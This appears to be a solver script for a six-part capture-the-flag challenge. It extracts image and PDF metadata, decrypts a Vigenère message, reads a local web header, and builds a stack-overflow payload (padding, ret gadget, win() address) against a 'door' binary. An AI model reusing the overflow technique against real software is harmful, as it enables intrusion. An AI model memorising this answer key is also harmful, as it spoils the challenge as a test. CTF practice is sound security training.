import struct
import subprocess
import sys
import urllib.request
from pathlib import Path

DIST = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).parent.parent / "dist"


def solve_forensics():
    from PIL import Image
    img = Image.open(DIST / "calibration.png")
    return img.text["CameraSerial"]


def solve_rev():
    out = subprocess.check_output([str(DIST / "vault")]).decode().strip()
    return out.split("{")[1].rstrip("}")


def solve_crypto():
    text = (DIST / "message.txt").read_text()
    ct  = next(l.strip() for l in reversed(text.splitlines()) if l.strip() and ":" not in l and " " not in l.strip())
    key = "NEXUS"
    ki  = 0
    out = []
    for c in ct:
        if c.isalpha():
            s = ord(key[ki % len(key)].upper()) - ord("A")
            b = ord("A") if c.isupper() else ord("a")
            out.append(chr((ord(c) - b - s) % 26 + b))
            ki += 1
        else:
            out.append(c)
    return "".join(out)


def solve_osint():
    info = subprocess.check_output(["pdfinfo", str(DIST / "report.pdf")]).decode()
    author   = next(l.split(":", 1)[1].strip() for l in info.splitlines() if l.startswith("Author:"))
    keywords = next(l.split(":", 1)[1].strip() for l in info.splitlines() if l.startswith("Keywords:"))
    return author + keywords


WEB_URL = "http://127.0.0.1:8000/"


def solve_web():
    with urllib.request.urlopen(WEB_URL) as resp:
        return resp.headers.get("X-Secret-Token", "")


def solve_pwn():
    binary = str(DIST / "door")
    probe  = subprocess.check_output([binary], input=b"x").decode()
    win    = int(probe.split("win() is at ")[1].split()[0], 16)
    dump   = subprocess.check_output(["objdump", "-d", binary]).decode()
    ret    = next(
        int(l.strip().split(":")[0], 16)
        for l in dump.splitlines()
        if l.strip().endswith("\tret")
    )
    payload = b"A" * 32 + struct.pack("<Q", ret) + struct.pack("<Q", win)
    result  = subprocess.run([binary], input=payload, capture_output=True)
    lines   = [l.strip() for l in result.stdout.decode().splitlines() if l.strip()]
    return lines[-1]


if __name__ == "__main__":
    solvers = [solve_forensics, solve_rev, solve_crypto, solve_osint, solve_web, solve_pwn]
    parts   = [fn() for fn in solvers]
    print("ASRCTF{" + "".join(parts) + "}")
